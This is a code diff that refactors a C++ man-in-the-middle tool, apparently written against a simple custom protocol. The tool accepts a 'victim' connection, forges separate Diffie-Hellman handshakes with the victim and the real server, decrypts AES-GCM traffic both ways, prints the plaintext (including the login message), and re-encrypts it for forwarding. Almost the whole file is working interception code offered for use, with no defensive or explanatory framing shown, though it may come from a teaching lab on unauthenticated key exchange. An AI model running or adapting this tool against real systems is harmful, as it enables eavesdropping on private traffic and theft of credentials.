@@ -1,160 +1,471 @@
-
 #include <openssl/bn.h>
 #include <openssl/evp.h>
 #include <openssl/rand.h>
 #include <openssl/sha.h>
-#include <sys/socket.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
+#include <sys/socket.h>
 #include <unistd.h>
 #include <cstring>
-#include <iostream>
-#include <string>
-#include <vector>
-#include <mutex>
-#include <thread>
-#include <atomic>
-#include <sstream>
 #include <iomanip>
-#include <algorithm>
+#include <iostream>
+using namespace std;
+#include <sstream>
+#include <string>
+#include <thread>
+#include <vector>
 
-static const char *GROUP14_P =
-"FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"
-"29024E088A67CC74020BBEA63B139B22514A08798E3404DD"
-"EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245"
-"E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED"
-"EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE65381"
-"FFFFFFFFFFFFFFFF";
-
-static std::string hex_of(const unsigned char *p, size_t n) {
-    std::ostringstream o;
-    for (size_t i=0;i<n;i++) o << std::hex << std::setw(2) << std::setfill('0') << (int)p[i];
-    return o.str();
+static string hex_of(const unsigned char *p, size_t n)
+{
+    ostringstream out;
+    for (size_t i = 0; i < n; ++i)
+    {
+        out << hex << setw(2) << setfill('0') << static_cast<int>(p[i]);
+    }
+    return out.str();
 }
-static std::vector<unsigned char> unhex(const std::string &s) {
-    std::vector<unsigned char> out;
-    if (s.size()%2) return {};
-    for(size_t i=0;i<s.size();i+=2) out.push_back((unsigned char)std::stoul(s.substr(i,2),nullptr,16));
+
+static string b64(const unsigned char *p, int n)
+{
+    string out(4 * ((n + 2) / 3), '\0');
+    int written = EVP_EncodeBlock(reinterpret_cast<unsigned char *>(out.data()), p, n);
+    out.resize(written);
     return out;
 }
-static std::string b64(const unsigned char *p, int n) {
-    std::string out(4*((n+2)/3), '\0');
-    int m=EVP_EncodeBlock((unsigned char*)out.data(),p,n);
-    out.resize(m); return out;
+
+static vector<unsigned char> unb64(const string &s)
+{
+    vector<unsigned char> out((s.size() * 3) / 4 + 4);
+    int n = EVP_DecodeBlock(out.data(), reinterpret_cast<const unsigned char *>(s.data()), static_cast<int>(s.size()));
+    if (n < 0)
+    {
+        return {};
+    }
+    int pad = 0;
+    if (!s.empty() && s.back() == '=')
+    {
+        ++pad;
+    }
+    if (s.size() > 1 && s[s.size() - 2] == '=')
+    {
+        ++pad;
+    }
+    out.resize(n - pad);
+    return out;
 }
-static std::vector<unsigned char> unb64(const std::string &s) {
-    std::vector<unsigned char> out((s.size()*3)/4+4);
-    int n=EVP_DecodeBlock(out.data(),(const unsigned char*)s.data(),(int)s.size());
-    if(n<0) return {};
-    int pad=0; if(!s.empty()&&s.back()=='=') pad++; if(s.size()>1&&s[s.size()-2]=='=') pad++;
-    out.resize(n-pad); return out;
-}
-static std::string recv_line(int fd, size_t maxlen=1024*1024) {
-    std::string s; char c;
-    while(s.size()<maxlen) {
-        ssize_t n=recv(fd,&c,1,0);
-        if(n<=0) return {};
-        if(c=='\n') return s;
+
+static string recv_line(int fd, size_t maxlen = 1024 * 1024)
+{
+    string s;
+    char c = '\0';
+    while (s.size() < maxlen)
+    {
+        ssize_t n = recv(fd, &c, 1, 0);
+        if (n <= 0)
+        {
+            return {};
+        }
+        if (c == '\n')
+        {
+            return s;
+        }
         s.push_back(c);
     }
     return {};
 }
-static bool send_all(int fd,const std::string &s) {
-    size_t off=0; while(off<s.size()) {
-        ssize_t n=send(fd,s.data()+off,s.size()-off,MSG_NOSIGNAL);
-        if(n<=0) return false; off+=n;
+
+static bool send_all(int fd, const string &s)
+{
+    size_t off = 0;
+    while (off < s.size())
+    {
+        ssize_t n = send(fd, s.data() + off, s.size() - off, MSG_NOSIGNAL);
+        if (n <= 0)
+        {
+            return false;
+        }
+        off += static_cast<size_t>(n);
     }
     return true;
 }
-static BIGNUM *bn_from_hex(const char *s) { BIGNUM *x=nullptr; BN_hex2bn(&x,s); return x; }
 
-static bool dh_make(BIGNUM *p, BIGNUM *g, BIGNUM **priv, BIGNUM **pub) {
-    *priv=BN_new(); *pub=BN_new(); BN_CTX *ctx=BN_CTX_new();
-    if(!*priv||!*pub||!ctx) return false;
-    if(!BN_priv_rand(*priv,BN_num_bits(p)-1,BN_RAND_TOP_TWO,BN_RAND_BOTTOM_ANY)) return false;
-    if(!BN_mod_exp(*pub,g,*priv,p,ctx)) return false;
-    BN_CTX_free(ctx); return true;
+static bool send_line(int fd, const string &s)
+{
+    return send_all(fd, s + "\n");
 }
-static BIGNUM *dh_shared(const BIGNUM *peer,const BIGNUM *priv,const BIGNUM *p) {
-    BIGNUM *s=BN_new(); BN_CTX *ctx=BN_CTX_new();
-    if(!s||!ctx) { BN_free(s); BN_CTX_free(ctx); return nullptr; }
-    if(!BN_mod_exp(s,peer,priv,p,ctx)) { BN_free(s); s=nullptr; }
-    BN_CTX_free(ctx); return s;
-}
-static std::vector<unsigned char> derive_key(const BIGNUM *secret) {
-    int n=BN_num_bytes(secret); std::vector<unsigned char> raw(n);
-    BN_bn2bin(secret,raw.data());
-    unsigned char h[SHA256_DIGEST_LENGTH]; SHA256(raw.data(),raw.size(),h);
-    return std::vector<unsigned char>(h,h+32);
-}
-static std::string fingerprint(const std::vector<unsigned char>& key) {
-    unsigned char h[SHA256_DIGEST_LENGTH]; SHA256(key.data(),key.size(),h);
-    return hex_of(h,32);
-}
-static std::string gcm_encrypt(const std::vector<unsigned char>& key,const std::string& plain) {
-    unsigned char nonce[12]; if(RAND_bytes(nonce,12)!=1) return {};
-    EVP_CIPHER_CTX *c=EVP_CIPHER_CTX_new(); if(!c) return {};
-    std::vector<unsigned char> ct(plain.size()+16); int l1=0,l2=0;
-    bool ok=EVP_EncryptInit_ex(c,EVP_aes_256_gcm(),nullptr,nullptr,nullptr)==1;
-    ok=ok&&EVP_CIPHER_CTX_ctrl(c,EVP_CTRL_GCM_SET_IVLEN,12,nullptr)==1;
-    ok=ok&&EVP_EncryptInit_ex(c,nullptr,nullptr,key.data(),nonce)==1;
-    ok=ok&&EVP_EncryptUpdate(c,ct.data(),&l1,(const unsigned char*)plain.data(),(int)plain.size())==1;
-    ok=ok&&EVP_EncryptFinal_ex(c,ct.data()+l1,&l2)==1;
-    unsigned char tag[16]; ok=ok&&EVP_CIPHER_CTX_ctrl(c,EVP_CTRL_GCM_GET_TAG,16,tag)==1;
-    EVP_CIPHER_CTX_free(c); if(!ok) return {};
-    std::vector<unsigned char> wire(nonce,nonce+12);
-    wire.insert(wire.end(),ct.begin(),ct.begin()+l1+l2); wire.insert(wire.end(),tag,tag+16);
-    return "ENC|"+b64(wire.data(),(int)wire.size());
-}
-static bool gcm_decrypt(const std::vector<unsigned char>& key,const std::string& msg,std::string& plain) {
-    if(msg.rfind("ENC|",0)!=0) return false;
-    auto w=unb64(msg.substr(4)); if(w.size()<28) return false;
-    const unsigned char *nonce=w.data(), *tag=w.data()+w.size()-16, *ct=w.data()+12;
-    int ctlen=(int)w.size()-28, l1=0,l2=0; std::vector<unsigned char> pt(ctlen+1);
-    EVP_CIPHER_CTX *c=EVP_CIPHER_CTX_new(); if(!c) return false;
-    bool ok=EVP_DecryptInit_ex(c,EVP_aes_256_gcm(),nullptr,nullptr,nullptr)==1;
-    ok=ok&&EVP_CIPHER_CTX_ctrl(c,EVP_CTRL_GCM_SET_IVLEN,12,nullptr)==1;
-    ok=ok&&EVP_DecryptInit_ex(c,nullptr,nullptr,key.data(),nonce)==1;
-    ok=ok&&EVP_DecryptUpdate(c,pt.data(),&l1,ct,ctlen)==1;
-    ok=ok&&EVP_CIPHER_CTX_ctrl(c,EVP_CTRL_GCM_SET_TAG,16,(void*)tag)==1;
-    ok=ok&&EVP_DecryptFinal_ex(c,pt.data()+l1,&l2)==1;
-    EVP_CIPHER_CTX_free(c); if(!ok) return false;
-    plain.assign((char*)pt.data(),l1+l2); return true;
-}
-static void free_bn(BIGNUM *&x){ BN_free(x); x=nullptr; }
 
-static int conn(const std::string&ip,int port){
- int f=socket(AF_INET,SOCK_STREAM,0);sockaddr_in a{};a.sin_family=AF_INET;a.sin_port=htons(port);inet_pton(AF_INET,ip.c_str(),&a.sin_addr);
- if(connect(f,(sockaddr*)&a,sizeof(a))<0){close(f);return -1;}return f;
+static BIGNUM *bn_from_hex(const char *s)
+{
+    BIGNUM *x = nullptr;
+    BN_hex2bn(&x, s);
+    return x;
 }
-static bool relay_one(int in,int out,const std::vector<unsigned char>&kin,const std::vector<unsigned char>&kout,const std::string&label){
- std::string w=recv_line(in);if(w.empty())return false;std::string p;if(!gcm_decrypt(kin,w,p)){std::cerr<<"[MITM] "<<label<<" authentication failure\n";return false;}
- std::cout<<"[MITM "<<label<<" PLAINTEXT] "<<p<<"\n";auto e=gcm_encrypt(kout,p);return !e.empty()&&send_all(out,e+"\n");
+
+static string bn_to_hex(const BIGNUM *value)
+{
+    char *tmp = BN_bn2hex(value);
+    string out = tmp ? tmp : "";
+    OPENSSL_free(tmp);
+    return out;
 }
-int main(int argc,char**argv){
- if(argc<2||argc>3){std::cerr<<"Usage: "<<argv[0]<<" <server-ip> [listen-port]\n";return 1;}
- std::string serverip=argv[1];int lport=argc==3?std::stoi(argv[2]):6000;
- int ls=socket(AF_INET,SOCK_STREAM,0);int one=1;setsockopt(ls,SOL_SOCKET,SO_REUSEADDR,&one,sizeof(one));
- sockaddr_in a{};a.sin_family=AF_INET;a.sin_addr.s_addr=INADDR_ANY;a.sin_port=htons(lport);if(bind(ls,(sockaddr*)&a,sizeof(a))<0){perror("bind");return 1;}listen(ls,1);
- std::cout<<"[MITM] listening on port "<<lport<<"\n";
- int victim=accept(ls,nullptr,nullptr);if(victim<0)return 1;int real=conn(serverip,5000);if(real<0){perror("server connect");return 1;}
- BIGNUM *p=bn_from_hex(GROUP14_P),*g=BN_new(),*vpriv=nullptr,*vpub=nullptr,*spriv=nullptr,*spub=nullptr,*vpeer=nullptr,*speer=nullptr,*vs=nullptr,*ss=nullptr;BN_set_word(g,2);
- dh_make(p,g,&vpriv,&vpub);dh_make(p,g,&spriv,&spub);
- recv_line(real);recv_line(real); // server DH_P, DH_G
- std::string wp="DH_P|"+std::string(GROUP14_P)+"\n",wg="DH_G|2\n";
- send_all(victim,wp);send_all(victim,wg);send_all(victim,"DH_PUB|"+std::string(BN_bn2hex(vpub))+"\n");
- send_all(real,"DH_PUB|"+std::string(BN_bn2hex(spub))+"\n");
- std::string x=recv_line(victim);if(x.rfind("DH_PUB|",0)!=0)return 1;vpeer=bn_from_hex(x.substr(7).c_str());
- std::string y=recv_line(real);if(y.rfind("DH_PUB|",0)!=0)return 1;speer=bn_from_hex(y.substr(7).c_str());
- vs=dh_shared(vpeer,vpriv,p);ss=dh_shared(speer,spriv,p);auto vk=derive_key(vs),sk=derive_key(ss);
- std::cout<<"[MITM] victim-side fingerprint: "<<fingerprint(vk)<<"\n";
- std::cout<<"[MITM] server-side fingerprint: "<<fingerprint(sk)<<"\n";
- send_all(victim,"DH_PUB|"+std::string(BN_bn2hex(spub))+"\n");send_all(real,"DH_PUB|"+std::string(BN_bn2hex(vpub))+"\n");
- recv_line(victim);recv_line(real);send_all(victim,"DH_OK\n");send_all(real,"DH_OK\n");
- std::string lw=recv_line(victim);std::string lp;if(!gcm_decrypt(vk,lw,lp)){std::cerr<<"MITM login decrypt failed\n";return 1;}
- std::cout<<"[MITM C->S PLAINTEXT] "<<lp<<"\n";send_all(real,gcm_encrypt(sk,lp)+"\n");
- std::thread athread([&](){while(true){if(!relay_one(victim,real,vk,sk,"C->S"))break;}});
- std::thread bthread([&](){while(true){if(!relay_one(real,victim,sk,vk,"S->C"))break;}});
- athread.join();bthread.detach();
- close(victim);close(real);close(ls);free_bn(p);free_bn(g);free_bn(vpriv);free_bn(vpub);free_bn(spriv);free_bn(spub);free_bn(vpeer);free_bn(speer);free_bn(vs);free_bn(ss);return 0;
+
+static bool dh_make(BIGNUM *p, BIGNUM *g, BIGNUM **priv, BIGNUM **pub)
+{
+    *priv = BN_new();
+    *pub = BN_new();
+    BN_CTX *ctx = BN_CTX_new();
+    if (!*priv || !*pub || !ctx)
+    {
+        BN_CTX_free(ctx);
+        return false;
+    }
+    bool ok = BN_priv_rand(*priv, BN_num_bits(p) - 1, BN_RAND_TOP_TWO, BN_RAND_BOTTOM_ANY) == 1;
+    ok = ok && BN_mod_exp(*pub, g, *priv, p, ctx) == 1;
+    BN_CTX_free(ctx);
+    return ok;
+}
+
+static BIGNUM *dh_shared(const BIGNUM *peer, const BIGNUM *priv, const BIGNUM *p)
+{
+    BIGNUM *secret = BN_new();
+    BN_CTX *ctx = BN_CTX_new();
+    if (!secret || !ctx)
+    {
+        BN_free(secret);
+        BN_CTX_free(ctx);
+        return nullptr;
+    }
+    if (BN_mod_exp(secret, peer, priv, p, ctx) != 1)
+    {
+        BN_free(secret);
+        secret = nullptr;
+    }
+    BN_CTX_free(ctx);
+    return secret;
+}
+
+static vector<unsigned char> derive_key(const BIGNUM *secret)
+{
+    int n = BN_num_bytes(secret);
+    vector<unsigned char> raw(n);
+    BN_bn2bin(secret, raw.data());
+    unsigned char hash[SHA256_DIGEST_LENGTH];
+    SHA256(raw.data(), raw.size(), hash);
+    return vector<unsigned char>(hash, hash + SHA256_DIGEST_LENGTH);
+}
+
+static string fingerprint(const vector<unsigned char> &key)
+{
+    unsigned char hash[SHA256_DIGEST_LENGTH];
+    SHA256(key.data(), key.size(), hash);
+    return hex_of(hash, SHA256_DIGEST_LENGTH);
+}
+
+static string gcm_encrypt(const vector<unsigned char> &key, const string &plain)
+{
+    unsigned char nonce[12];
+    if (RAND_bytes(nonce, sizeof(nonce)) != 1)
+    {
+        return {};
+    }
+
+    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+    if (!ctx)
+    {
+        return {};
+    }
+
+    vector<unsigned char> ciphertext(plain.size() + 16);
+    int part1 = 0;
+    int part2 = 0;
+    bool ok = EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr) == 1;
+    ok = ok && EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, sizeof(nonce), nullptr) == 1;
+    ok = ok && EVP_EncryptInit_ex(ctx, nullptr, nullptr, key.data(), nonce) == 1;
+    ok = ok && EVP_EncryptUpdate(ctx, ciphertext.data(), &part1,
+                                 reinterpret_cast<const unsigned char *>(plain.data()),
+                                 static_cast<int>(plain.size())) == 1;
+    ok = ok && EVP_EncryptFinal_ex(ctx, ciphertext.data() + part1, &part2) == 1;
+
+    unsigned char tag[16];
+    ok = ok && EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, sizeof(tag), tag) == 1;
+    EVP_CIPHER_CTX_free(ctx);
+    if (!ok)
+    {
+        return {};
+    }
+
+    vector<unsigned char> wire(nonce, nonce + sizeof(nonce));
+    wire.insert(wire.end(), ciphertext.begin(), ciphertext.begin() + part1 + part2);
+    wire.insert(wire.end(), tag, tag + sizeof(tag));
+    return "ENC|" + b64(wire.data(), static_cast<int>(wire.size()));
+}
+
+static bool gcm_decrypt(const vector<unsigned char> &key, const string &msg, string &plain)
+{
+    if (msg.rfind("ENC|", 0) != 0)
+    {
+        return false;
+    }
+
+    auto wire = unb64(msg.substr(4));
+    if (wire.size() < 28)
+    {
+        return false;
+    }
+
+    const unsigned char *nonce = wire.data();
+    const unsigned char *ciphertext = wire.data() + 12;
+    const unsigned char *tag = wire.data() + wire.size() - 16;
+    int ciphertext_len = static_cast<int>(wire.size()) - 28;
+
+    vector<unsigned char> out(ciphertext_len + 1);
+    int part1 = 0;
+    int part2 = 0;
+    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+    if (!ctx)
+    {
+        return false;
+    }
+
+    bool ok = EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr) == 1;
+    ok = ok && EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, nullptr) == 1;
+    ok = ok && EVP_DecryptInit_ex(ctx, nullptr, nullptr, key.data(), nonce) == 1;
+    ok = ok && EVP_DecryptUpdate(ctx, out.data(), &part1, ciphertext, ciphertext_len) == 1;
+    ok = ok && EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, const_cast<unsigned char *>(tag)) == 1;
+    ok = ok && EVP_DecryptFinal_ex(ctx, out.data() + part1, &part2) == 1;
+    EVP_CIPHER_CTX_free(ctx);
+
+    if (!ok)
+    {
+        return false;
+    }
+
+    plain.assign(reinterpret_cast<char *>(out.data()), part1 + part2);
+    return true;
+}
+
+static void free_bn(BIGNUM *&x)
+{
+    BN_free(x);
+    x = nullptr;
+}
+
+static bool expect_prefix(const string &line, const string &prefix, string &value)
+{
+    if (line.rfind(prefix, 0) != 0)
+    {
+        return false;
+    }
+    value = line.substr(prefix.size());
+    return true;
+}
+
+static int connect_to(const string &ip, int port)
+{
+    int fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (fd < 0)
+    {
+        return -1;
+    }
+
+    sockaddr_in addr{};
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    if (inet_pton(AF_INET, ip.c_str(), &addr.sin_addr) != 1 || connect(fd, reinterpret_cast<sockaddr *>(&addr), sizeof(addr)) < 0)
+    {
+        close(fd);
+        return -1;
+    }
+    return fd;
+}
+
+static bool relay_one(int in_fd, int out_fd, const vector<unsigned char> &in_key,
+                      const vector<unsigned char> &out_key, const string &label)
+{
+    string wire = recv_line(in_fd);
+    if (wire.empty())
+    {
+        return false;
+    }
+
+    string plain;
+    if (!gcm_decrypt(in_key, wire, plain))
+    {
+        cerr << "[MITM] " << label << " authentication failure\n";
+        return false;
+    }
+
+    cout << "[MITM " << label << " PLAINTEXT] " << plain << "\n";
+    string rewrapped = gcm_encrypt(out_key, plain);
+    return !rewrapped.empty() && send_line(out_fd, rewrapped);
+}
+
+int main(int argc, char **argv)
+{
+    if (argc < 2 || argc > 4)
+    {
+        cerr << "Usage: " << argv[0] << " <server-ip> [server-port] [listen-port]\n";
+        return 1;
+    }
+
+    string server_ip = argv[1];
+    int server_port = argc >= 3 ? stoi(argv[2]) : 5000;
+    int listen_port = argc == 4 ? stoi(argv[3]) : 6000;
+
+    int listen_fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (listen_fd < 0)
+    {
+        perror("socket");
+        return 1;
+    }
+
+    int one = 1;
+    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
+
+    sockaddr_in addr{};
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = INADDR_ANY;
+    addr.sin_port = htons(listen_port);
+    if (bind(listen_fd, reinterpret_cast<sockaddr *>(&addr), sizeof(addr)) < 0)
+    {
+        perror("bind");
+        close(listen_fd);
+        return 1;
+    }
+
+    if (listen(listen_fd, 1) < 0)
+    {
+        perror("listen");
+        close(listen_fd);
+        return 1;
+    }
+
+    cout << "[MITM] listening on port " << listen_port << "\n";
+
+    int victim_fd = accept(listen_fd, nullptr, nullptr);
+    if (victim_fd < 0)
+    {
+        perror("accept");
+        close(listen_fd);
+        return 1;
+    }
+
+    int server_fd = connect_to(server_ip, server_port);
+    if (server_fd < 0)
+    {
+        perror("connect");
+        close(victim_fd);
+        close(listen_fd);
+        return 1;
+    }
+
+    string p_hex;
+    string g_hex;
+    string server_pub_hex;
+    if (!expect_prefix(recv_line(server_fd), "DH_P|", p_hex) ||
+        !expect_prefix(recv_line(server_fd), "DH_G|", g_hex) ||
+        !expect_prefix(recv_line(server_fd), "DH_PUB|", server_pub_hex))
+    {
+        cerr << "[MITM] failed to read server handshake\n";
+        close(victim_fd);
+        close(server_fd);
+        close(listen_fd);
+        return 1;
+    }
+
+    BIGNUM *p = bn_from_hex(p_hex.c_str());
+    BIGNUM *g = BN_new();
+    BIGNUM *victim_priv = nullptr;
+    BIGNUM *victim_pub = nullptr;
+    BIGNUM *server_priv = nullptr;
+    BIGNUM *server_pub = nullptr;
+    BIGNUM *victim_peer = nullptr;
+    BIGNUM *real_server_peer = bn_from_hex(server_pub_hex.c_str());
+    BIGNUM *victim_secret = nullptr;
+    BIGNUM *server_secret = nullptr;
+
+    if (!p || !g || BN_set_word(g, 2) != 1 ||
+        !real_server_peer || !dh_make(p, g, &victim_priv, &victim_pub) ||
+        !dh_make(p, g, &server_priv, &server_pub))
+    {
+        cerr << "[MITM] failed to initialize DH state\n";
+        return 1;
+    }
+
+    if (!send_line(victim_fd, "DH_P|" + p_hex) ||
+        !send_line(victim_fd, "DH_G|" + g_hex) ||
+        !send_line(victim_fd, "DH_PUB|" + bn_to_hex(victim_pub)) ||
+        !send_line(server_fd, "DH_PUB|" + bn_to_hex(server_pub)))
+    {
+        cerr << "[MITM] failed to send forged handshake\n";
+        return 1;
+    }
+
+    {
+        string victim_pub_hex;
+        if (!expect_prefix(recv_line(victim_fd), "DH_PUB|", victim_pub_hex))
+        {
+            cerr << "[MITM] victim did not send DH public value\n";
+            return 1;
+        }
+        victim_peer = bn_from_hex(victim_pub_hex.c_str());
+    }
+
+    if (!victim_peer)
+    {
+        cerr << "[MITM] invalid victim DH public value\n";
+        return 1;
+    }
+
+    victim_secret = dh_shared(victim_peer, victim_priv, p);
+    server_secret = dh_shared(real_server_peer, server_priv, p);
+    if (!victim_secret || !server_secret)
+    {
+        cerr << "[MITM] failed to derive shared secrets\n";
+        return 1;
+    }
+
+    auto victim_key = derive_key(victim_secret);
+    auto server_key = derive_key(server_secret);
+    cout << "[MITM] victim-side fingerprint: " << fingerprint(victim_key) << "\n";
+    cout << "[MITM] server-side fingerprint: " << fingerprint(server_key) << "\n";
+
+    string victim_ok = recv_line(victim_fd);
+    if (victim_ok != "DH_OK" || !send_line(server_fd, "DH_OK"))
+    {
+        cerr << "[MITM] handshake completion failed\n";
+        return 1;
+    }
+
+    thread to_server([&]()
+                     {
+        while (relay_one(victim_fd, server_fd, victim_key, server_key, "C->S"))
+        {
+        } });
+    thread to_victim([&]()
+                     {
+        while (relay_one(server_fd, victim_fd, server_key, victim_key, "S->C"))
+        {
+        } });
+
+    to_server.join();
+    shutdown(server_fd, SHUT_RDWR);
+    shutdown(victim_fd, SHUT_RDWR);
+    to_victim.join();
+
+    close(victim_fd);
+    close(server_fd);
+    close(listen_fd);
+
+    free_bn(p);
+    free_bn(g);
+    free_bn(victim_priv);
+    free_bn(victim_pub);
+    free_bn(server_priv);
+    free_bn(server_pub);
+    free_bn(victim_peer);
+    free_bn(real_server_peer);
+    free_bn(victim_secret);
+    free_bn(server_secret);
+    return 0;
 }
